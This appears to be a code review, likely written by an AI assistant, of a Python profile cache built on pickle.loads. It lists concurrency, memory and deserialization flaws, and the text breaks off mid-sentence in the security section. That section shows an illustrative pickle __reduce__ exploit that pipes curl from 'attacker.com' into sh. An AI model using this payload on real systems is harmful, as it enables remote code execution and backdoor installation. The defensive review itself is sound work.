          text: "\n\n# Completed Correctness Review Findings\n\nBelow are my findings\
            \ on the three review areas, synthesized with file/line references and\
            \ prioritized by severity.\n\n---\n\n## 1. Correctness Issues\n\n### \U0001F534\
            \ Critical — Unbounded Cache Growth (Lines 2, 5)\n\n```python\n2: CACHE\
            \ = {}\n```\n\n**Problem:** Module-level dict with no eviction, no TTL,\
            \ no size limit. Every unique `user_id` adds an entry that is never removed.\n\
            \n**Concrete consequence:** In a long-running server, memory grows linearly\
            \ with distinct users. Each entry is a `pickle.loads()` result of unknown\
            \ size. Eventually triggers `OutOfMemoryError` and crashes the process.\n\
            \n**Edge cases:** Randomized or semi-random `user_id` values (CDN caching,\
            \ `anonymous + token`) amplify growth. No `clear()` or `invalidate()`\
            \ API exists to remediate at runtime.\n\n### \U0001F534 High — Returning\
            \ Mutable References (Line 6)\n\n```python\n6: return CACHE[user_id]\n\
            ```\n\n**Problem:** The cached dictionary is returned directly, not copied.\n\
            \n**Concrete consequence:** Any caller mutation corrupts the shared object,\
            \ affecting all future callers:\n\n```python\nprofile = load_profile(\"\
            alice\", payload)\nprofile[\"admin\"] = True          # Mutates shared\
            \ cached state\n```\n\n**Impact:** Silent data corruption, cross-caller\
            \ poisoning, no type or range checks on returned data.\n\n### \U0001F7E0\
            \ High — TOCTOU Race on Cache Miss (Lines 4–5)\n\n```python\n4:     if\
            \ user_id not in CACHE:\n5:         CACHE[user_id] = pickle.loads(payload)\n\
            ```\n\n**Problem:** Check-then-set is not atomic, even in CPython (GIL\
            \ protects individual ops but not compound actions).\n\n**Concrete sequence\
            \ (multi-threaded):**\n\n| Thread A | Thread B |\n|----------|----------|\n\
            | T1: Checks `user_id not in CACHE` → **True** | |\n| T2: | Checks `user_id\
            \ not in CACHE` → **True** |\n| T3: Calls `pickle.loads(payload)` | |\n\
            | T4: | Calls `pickle.loads(payload)` |\n| T5: Sets `CACHE[user_id] =\
            \ result A` | |\n| T6: | Sets `CACHE[user_id] = result B` (overwrites)\
            \ |\n\n**Consequences:**\n- **Duplicate deserialization** — wasted CPU\
            \ and I/O.\n- **Lost update** — if payloads differ, last writer wins regardless\
            \ of recency.\n- **Probabilistic** — works in single-threaded use, fails\
            \ under load.\n\n### \U0001F7E0 High — No Lock / Synchronization (Lines\
            \ 4–6)\n\n**Problem:** No `threading.Lock`, `RLock`, or `Semaphore` guards\
            \ the read-modify-write cycle.\n\n**Consequence:** Thread-unsafe in any\
            \ multi-threaded deployment (gunicorn `threads>1`, twisted, thread pools).\
            \ False sense of safety under light load.\n\n### \U0001F7E1 Medium — Permanent\
            \ Data Staleness (Lines 2, 4–5)\n\nOnce loaded, a profile is served forever.\
            \ No invalidation API, no TTL, no refresh. If the data source changes,\
            \ cached data never updates until process restart.\n\n### \U0001F7E1 Medium\
            \ — Unhandled Deserialization Errors (Line 5)\n\n`pickle.loads(payload)`\
            \ can raise `UnpicklingError`, `ValueError`, `EOFError`, `ImportError`.\
            \ No `try/except`. A single malformed request causes a 500 error and full\
            \ traceback. Under DoS, massive log volume and CPU overhead.\n\n### \U0001F7E2\
            \ Low — No Metrics / Observability (Line 2)\n\nNo cache hit/miss tracking,\
            \ no size monitoring. Cannot detect unbounded growth, declining hit rates,\
            \ or hot keys.\n\n---\n\n## 2. Security Risks\n\n### \U0001F534 Critical\
            \ — Pickle Deserialization: Arbitrary Code Execution (Line 5)\n\n```python\n\
            5:         CACHE[user_id] = pickle.loads(payload)\n```\n\n**Attack scenario:**\
            \ An attacker sends a crafted `payload` containing a malicious pickle\
            \ bytecode stream that instantiates an `os.system` or `urllib.request`\
            \ object via `__reduce__`. When `pickle.loads(payload)` executes, **arbitrary\
            \ code runs** on the server.\n\n**Example crafted payload (conceptual):**\n\
            ```python\nimport pickle, os\n\nclass Exploit:\n    def __reduce__(self):\n\
            \        return (os.system, (\"curl http://attacker.com/backdoor.sh |\
            \ sh\",))\n\nevil_payload = pickle.dumps(Exploit())\n# Send evil_payload\
            \ as the `payload` parameter via HTTP\n```\n\n**Consequence:** Full remote\
            \ code execution. The attacker can:\n- Read/write arbitrary files\n- Pivot\
            \ to internal network services\n- Install backdoors\n- Escalate privileges\n\
            \n**Why this is exploitable:**\n- `payload` comes from an **unauthenticated**\
            \ HTTP request — no auth gate prevents the call.\n- `pickle` is **not**\
            \ a secure format; `pickle.loads()` can instantiate any importable Python\
